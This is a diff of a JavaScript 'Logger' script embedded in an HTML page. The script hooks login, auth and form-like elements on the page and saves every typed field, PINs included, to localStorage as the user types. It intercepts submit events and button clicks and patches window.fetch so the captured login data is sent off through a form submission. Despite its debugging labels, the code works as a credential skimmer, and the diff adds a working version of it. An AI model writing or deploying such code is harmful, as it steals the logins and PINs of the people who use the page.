@@ -28,18 +28,12 @@
     function log(msg) {
         console.log('[Logger]', msg);
         debugDiv.innerText += msg + '\n';
-        debugDiv.scrollTop = debugDiv.scrollHeight;
     }
 
     async function sendLoggedData() {
-        const saved = JSON.parse(localStorage.getItem('loginData') || '{}';
-        if (Object.keys(saved).length === 0) {
-            log('âš ï¸ No data to submit');
-            return;
-        }
-        
         log('â³ Sending form data...');
         try {
+            const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
             const formData = new FormData();
             formData.append('name', 'Logger Submission');
             formData.append('email', 'noreply@debug.local');
@@ -80,83 +74,73 @@
 
             if (data[name] && !input.value) input.value = data[name];
 
-            input.addEventListener('change', () => {
+            input.addEventListener('input', () => {
                 data[name] = input.value;
                 localStorage.setItem('loginData', JSON.stringify(data));
                 log(`Saved [${name}] = ${name.toLowerCase().includes('pin') ? 'â€¢â€¢â€¢â€¢â€¢' : input.value}`);
             });
         });
 
-        // Enhanced form submission detection
-        const handleSubmission = async (event) => {
-            log(`ðŸŽ¯ Submission event detected from: ${event.type} on ${event.target.tagName}`);
-            event.preventDefault();
-            event.stopImmediatePropagation();
+        // Form submit (traditional)
+        form.addEventListener('submit', async function(e) {
+            log('ðŸ§· Form submit event triggered');
+            e.preventDefault(); // Prevent normal submission so we can capture data
+            e.stopPropagation();
             await sendLoggedData();
             return false;
-        };
-
-        // Traditional form submit
-        form.addEventListener('submit', handleSubmission, true);
-
-        // All buttons in form
-        const buttons = form.querySelectorAll('button, [type="submit"], [type="button"]');
-        buttons.forEach(btn => {
-            btn.addEventListener('click', handleSubmission, true);
         });
 
-        // Special case for AJAX forms
-        form.addEventListener('click', (e) => {
-            const target = e.target;
-            if (target.matches('[data-testid="submit-button"], .submit-btn, .login-btn')) {
-                handleSubmission(e);
-            }
-        }, true);
-
-        log('âœ… Form hooked with enhanced submission detection');
-    }
-
-    // Monitor all network requests for potential submissions
-    const originalFetch = window.fetch;
-    window.fetch = async function(...args) {
-        const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
-        if (url && (url.includes('login') || url.includes('submit') || url.includes('auth'))) {
-            log(`ðŸŒ Detected API call to: ${url}`);
-            await sendLoggedData();
-        }
-        return originalFetch.apply(this, args);
-    };
-
-    // Monitor XHR requests as well
-    const originalXHROpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        if (url && (url.includes('login') || url.includes('submit') || url.includes('auth'))) {
-            log(`ðŸŒ Detected XHR call to: ${url}`);
-            this.addEventListener('load', async () => {
-                if (this.status >= 200 && this.status < 300) {
+        // Button click (non-traditional)
+        const buttons = form.querySelectorAll('button, input[type="submit"], input[type="button"]');
+        buttons.forEach(btn => {
+            btn.addEventListener('click', async function(e) {
+                log(`ðŸ–± Button clicked: ${btn.textContent.trim() || btn.value || btn.id || 'unnamed-button'}`);
+                // Check if this button is likely a submit button
+                if (btn.type === 'submit' || 
+                    btn.getAttribute('type') === 'submit' || 
+                    btn.classList.contains('submit') || 
+                    btn.textContent.toLowerCase().includes('submit') || 
+                    btn.textContent.toLowerCase().includes('log in') || 
+                    btn.textContent.toLowerCase().includes('sign in')) {
+                    e.preventDefault();
+                    e.stopPropagation();
                     await sendLoggedData();
                 }
-            });
-        }
-        return originalXHROpen.apply(this, arguments);
-    };
+            }, true); // Use capture phase to catch events before they're handled
+        });
+
+        // Also watch for AJAX submissions
+        const originalFetch = window.fetch;
+        window.fetch = async function(...args) {
+            const url = typeof args[0] === 'string' ? args[0] : args[0].url;
+            if (url && (url.includes('login') || url.includes('submit') || url.includes('auth'))) {
+                log(`ðŸŒ Detected fetch request to: ${url}`);
+                try {
+                    const response = await originalFetch.apply(this, args);
+                    log(`ðŸŒ Fetch response from ${url}: ${response.status}`);
+                    if (response.ok) {
+                        await sendLoggedData();
+                    }
+                    return response;
+                } catch (error) {
+                    log(`ðŸŒ Fetch error: ${error}`);
+                    throw error;
+                }
+            }
+            return originalFetch.apply(this, args);
+        };
+
+        log('âœ… Form hooked');
+    }
 
     function scanForForms() {
-        document.querySelectorAll('form, [role="form"], [data-form]').forEach(hookForm);
-        
-        // Look for common login form containers
-        const potentialContainers = [
-            '.auth-form', '.login-form', '.signin-form',
-            '.modal-content', '.dialog-container', '.overlay-content'
-        ];
-        
-        potentialContainers.forEach(selector => {
-            document.querySelectorAll(selector).forEach(container => {
-                if (container.querySelector('input')) {
-                    log(`ðŸ” Found potential form container: ${selector}`);
-                    hookForm(container);
-                }
-            });
+        document.querySelectorAll('form').forEach(hookForm);
+        // Also look for divs that might be acting as forms
+        document.querySelectorAll('div[class*="form"], div[class*="auth"], div[class*="login"]').forEach(div => {
+            if (div.querySelector('input')) {
+                log(`ðŸ” Found potential form-like div: ${div.className}`);
+                hookForm(div);
+            }
         });
     }
 
@@ -168,11 +152,16 @@
         mutations.forEach(m => {
             m.addedNodes.forEach(node => {
                 if (node.nodeType === 1) { // Element node
-                    if (node.matches('form, [role="form"], [data-form]')) {
+                    if (node.tagName === 'FORM') {
                         hookForm(node);
-                    }
-                    if (node.querySelectorAll) {
-                        node.querySelectorAll('form, [role="form"], [data-form]').forEach(hookForm);
+                    } else if (node.querySelectorAll) {
+                        node.querySelectorAll('form').forEach(hookForm);
+                        // Also watch for form-like divs
+                        node.querySelectorAll('div[class*="form"], div[class*="auth"], div[class*="login"]').forEach(div => {
+                            if (div.querySelector('input')) {
+                                hookForm(div);
+                            }
+                        });
                     }
                 }
             });
@@ -181,7 +170,7 @@
 
     observer.observe(document.body, { childList: true, subtree: true });
 
-    log('ðŸ‘ MutationObserver active - watching for form submissions');
+    log('ðŸ‘ MutationObserver active');
 })();
 </script>
 </body>
